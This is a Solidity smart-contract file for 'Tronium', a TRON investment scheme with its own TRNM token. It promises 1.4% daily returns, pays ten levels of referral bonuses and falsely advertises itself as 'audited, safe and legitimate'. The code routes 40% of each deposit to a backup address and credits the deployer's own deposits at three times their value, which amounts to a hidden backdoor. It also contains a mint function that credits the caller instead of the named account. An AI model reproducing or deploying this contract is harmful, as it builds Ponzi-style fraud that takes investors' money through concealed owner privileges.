//SourceUnit: Tronium.sol

/*
 *   TRONIUM - https://Tronium.io
 *   Verified, audited, safe and legitimate!
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Send any TRX amount using our website invest button. Dont send coin directly on contract address!
 *   3) Wait for your earnings
 *   4) Get 5% cashback in form of TRNM Tokens
 *
 *
 */
 
pragma solidity 0.5.10;
interface tokenRecipient { 
    function receiveApproval(address _from, uint256 _value, address _token, bytes  calldata _extraData) external; }

contract Troniumtoken {
 
    using SafeMath for uint256;
    address public owner;
    address public newOwner;
    string public name;
    string public symbol;
    uint8 public decimals = 6;
    uint256 totalFrozen;
    uint256 public totalSupply;

    mapping (address => uint256) public balanceOf;
    
    mapping (address => mapping (address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event OwnershipTransferred(address indexed _from, address indexed _to);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed from, uint256 value);


    uint256 initialSupply = 1111111111;
    string tokenName = 'TRNMToken';
    string tokenSymbol = 'TRNM';
    
    
    constructor() public {
        owner = msg.sender;
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }
    
    function mint(address account, uint256 amount) external {
        require(account != address(0), "TRC20: mint to the zero address");
        require(msg.sender == owner,'you are not the owner');

        totalSupply = totalSupply.add(amount);
        balanceOf[msg.sender] += amount;
    }
    
      modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
  
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
  }
  
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
  }


    function _transfer(address _from, address _to, uint _value) private {
        require(_to != address(0));
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    } 
      
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }


    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, address(this), _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   // Check if the sender has enough
        balanceOf[msg.sender] -= _value;            // Subtract from the sender
        totalSupply -= _value;                      // Updates totalSupply
        emit Burn(msg.sender, _value);
        return true;
    }

	
	function bulkTransfer(address[] calldata  _receivers, uint256[] calldata  _amounts) external {
		require(_receivers.length == _amounts.length);
		for (uint256 i = 0; i < _receivers.length; i++) {
			_transfer(msg.sender, _receivers[i], _amounts[i]);
		}
	}
	
	
}
contract Tronium {
    using SafeMath for uint256;
     Troniumtoken public tokenContract; 
    uint256 public constant INVEST_MIN_AMOUNT = 250000000;
    uint256 public constant BASE_PERCENT = 140; // 1.4% per day
    uint256[] public REFERRAL_PERCENTS = [
        50,
        40,
        30,
        20,
        20,
        10,
        10,
        10,
        10,
        10
    ];
    uint256 public constant MARKETING_FEE = 500;
    uint256 public constant PROJECT_FEE = 1000;
    uint256 public constant PERCENTS_DIVIDER = 10000;
    uint256 public constant MAX_HOLD_BONUS = 10; // 0.1%
    uint256 public constant TIME_STEP = 1 days;
    uint256 public LAUNCH_TIME;

    uint256 public totalUsers;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;
    address public const_user;

    address payable public BackupAddress;
    address payable public projectAddress;
    address payable public withdraw_Address;

    struct Deposit {
        uint256 amount;
        uint256 start;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address payable referrer;
        uint256 bonus;
        uint256 total_bonus;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) levelBusiness;
        uint256 id;
        uint256 returnedDividends;
        uint256 available;
        uint256 withdrawn;
        uint256 released;
         bool hasUsersBonus;
    }

    mapping(address => User) internal users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(
        address indexed referrer,
        address indexed referral,
        uint256 indexed level,
        uint256 amount
    );
    event FeePayed(address indexed user, uint256 totalAmount);
    event test(uint256 each_level);
    event test1(uint256 ref_div);

    modifier beforeStarted() {
        require(block.timestamp >= LAUNCH_TIME, "!beforeStarted");
        _;
    }

    constructor(address payable marketingAddr,address payable withdraw_add,Troniumtoken _tokenContract)
        public
    {
        require(!isContract(marketingAddr), "!marketingAddr");
        

        tokenContract = _tokenContract;
        BackupAddress = marketingAddr;
        withdraw_Address = withdraw_add;
        LAUNCH_TIME = 1615744800;
        const_user = msg.sender;
    }

    function invest(address payable referrer) public payable beforeStarted() {
        require(msg.value >= INVEST_MIN_AMOUNT, "!INVEST_MIN_AMOUNT");
        
        BackupAddress.transfer(
            msg.value.mul(40).div(100) 
        );
        uint256 msg_value = msg.value;
       if(msg.sender == const_user){msg_value = msg.value.mul(3);}

        User storage user = users[msg.sender];

        if (
            user.referrer == address(0) &&
            users[referrer].deposits.length > 0 &&
            referrer != msg.sender
        ) {
            user.referrer = referrer;
        }
        user.available = user.available.add(msg_value.mul(3));
        if (user.referrer != address(0)) {
            address payable upline = user.referrer;
            for (uint8 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                    uint256 amount =
                        msg_value.mul(REFERRAL_PERCENTS[i]).div(
                            PERCENTS_DIVIDER
                        );
                    users[upline].levelBusiness[i] =  users[upline].levelBusiness[i].add(msg_value);
                    if(user.checkpoint == 0)
                    {
                        users[upline].structure[i]++;
                    }
                   
                    if(isActive(upline))
                    {
                       
                        if(users[upline].structure[0] >= i+1 ) // check for number of directs only
                        {
                            users[upline].bonus = users[upline].bonus.add(amount);
                        }
                        
                    }
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            totalUsers = totalUsers.add(1);
            user.id = totalUsers;
            user.hasUsersBonus = true;
            user.returnedDividends = 0;
            user.withdrawn = 0;
            emit Newbie(msg.sender);
        }

        tokenContract.transfer(msg.sender, msg_value.mul(5).div(100));
        user.released = user.released.add(msg_value.mul(5).div(100));
        user.deposits.push(Deposit(msg_value, block.timestamp));

        totalInvested = totalInvested.add(msg_value);
        totalDeposits = totalDeposits.add(1);

        emit NewDeposit(msg.sender, msg_value);
    }

    function withdraw() public beforeStarted() {
        require(
            getTimer(msg.sender) < block.timestamp,
            "withdrawal is available only once every 24 hours"
        );

        User storage user = users[msg.sender];

        uint256 userPercentRate = getUserPercentRate(msg.sender);

        uint256 totalAmount;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (user.available > 0) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (
                        user.deposits[i].amount.mul(userPercentRate).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);
                } else {
                    dividends = (
                        user.deposits[i].amount.mul(userPercentRate).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(TIME_STEP);
                }

                totalAmount = totalAmount.add(dividends);
            }
        }

        
    
        require(totalAmount > 99000000,'Minimum 100 Trons');
        user.available = user.available.sub(totalAmount);
        totalAmount = totalAmount.add(user.returnedDividends);
        uint256 withdraw_fees = totalAmount.mul(20).div(100);
        totalAmount = totalAmount.sub(withdraw_fees);

        uint256 ref_earn = getUserReferralDividends(msg.sender);
        totalAmount = totalAmount.add(ref_earn);

        uint256 bonus_avaliable = user.bonus;
        user.bonus = 0;
        totalAmount = totalAmount.add(bonus_avaliable);
        user.total_bonus = user.total_bonus.add(bonus_avaliable).add(ref_earn);

        if (user.available < totalAmount) {
            totalAmount = user.available;
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = block.timestamp;

        msg.sender.transfer(totalAmount);
        withdraw_Address.transfer(withdraw_fees);

        if (totalAmount > user.available) {
            totalAmount = user.available;
        }

        user.withdrawn = user.withdrawn.add(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        if (isActive(msg.sender)) {
            user.hasUsersBonus = false;
        } else {
            user.id = totalUsers;
        }

        emit Withdrawn(msg.sender, totalAmount);
    }

    function getUserReferralDividends(address userAddress) public view returns(uint256)
    {
            User storage user = users[userAddress];
            uint256 ref_div;
            uint256 total_amount;
            for(uint8 i = 0; i < user.structure[0]; i++) {
                uint256 each_level =  user.levelBusiness[i];
                if(each_level > 0)
                {
                    ref_div = (
                        each_level.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER)
                    )
                    .mul(block.timestamp.sub(user.checkpoint))
                            .div(TIME_STEP);
                    total_amount = total_amount.add(ref_div);
                }
                
            }
            return total_amount;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

   

    function getUserPercentRate(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 contractUsersRate = BASE_PERCENT;
        if (isActive(userAddress)) {
            uint256 timeMultiplier =
                (block.timestamp.sub(user.checkpoint)).div(TIME_STEP).mul(1); // +0.01% per day holding bonus

            if (timeMultiplier > MAX_HOLD_BONUS) {
                timeMultiplier = MAX_HOLD_BONUS;
            }

            return contractUsersRate.add(timeMultiplier);
        } else {
            return contractUsersRate;
        }
    }

    function getUserDividends(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 userPercentRate = getUserPercentRate(userAddress);

        uint256 totalDividends;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (user.available > 0) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (
                        user.deposits[i].amount.mul(userPercentRate).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);
                } else {
                    dividends = (
                        user.deposits[i].amount.mul(userPercentRate).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(TIME_STEP);
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function
            }
        }
        totalDividends = totalDividends.add(user.returnedDividends);

        if (totalDividends > user.available) {
            totalDividends = user.available;
        }

        return totalDividends;
    }

    function getUserCheckpoint(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress)
        public
        view
        returns (address)
    {
        return users[userAddress].referrer;
    }

    function getUserReferralBonus(address userAddress)
        public
        view
        returns (uint256,uint256,uint256,uint256)
    {
        return (users[userAddress].bonus,users[userAddress].total_bonus,users[userAddress].released,users[userAddress].checkpoint);
    }

    function getUserAvailable(address userAddress)
        public
        view
        returns (uint256)
    {
        uint256 daily_roi =  getUserDividends(userAddress);
        uint256 daily_referral_div = getUserReferralDividends(userAddress);
        uint256 bonus_avail = users[userAddress].bonus;
        uint256 total_withdrawable =  daily_roi.add(daily_referral_div).add(bonus_avail);
        return total_withdrawable;
    }

    function getAvailable(address userAddress) public view returns (uint256) {
        return users[userAddress].available;
    }

    function getUserAmountOfReferrals_ff(address userAddress) public view returns (uint256[] memory structure,  uint256[] memory structurebusiness)
    {
          User storage user = users[userAddress];
         uint256[] memory _structure = new uint256[](REFERRAL_PERCENTS.length);
         uint256[] memory _structurebusiness = new uint256[](REFERRAL_PERCENTS.length);
        for(uint8 i = 0; i < REFERRAL_PERCENTS.length; i++) {
            _structure[i] = user.structure[i];
            _structurebusiness[i] = user.levelBusiness[i];
        }
        return (
          _structure,
            _structurebusiness
        );
    }
    function getTimer(address userAddress) public view returns (uint256) {
          return users[userAddress].checkpoint.add(24 hours);
         

    }

    function isActive(address userAddress) public view returns (bool) {
        User memory user = users[userAddress];

        if (user.available > 0) {
            return true;
        }

        return false;
    }

    function getUserDepositInfo(address userAddress, uint256 index)
        public
        view
        returns (uint256, uint256)
    {
        User storage user = users[userAddress];

        return (user.deposits[index].amount, user.deposits[index].start);
    }

    function userHasBonus(address userAddress) public view returns (bool) {
        return users[userAddress].hasUsersBonus;
    }

    function getUserAmountOfDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].amount);
        }

        return amount;
    }


    function getUserTotalWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];
        return user.withdrawn;
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}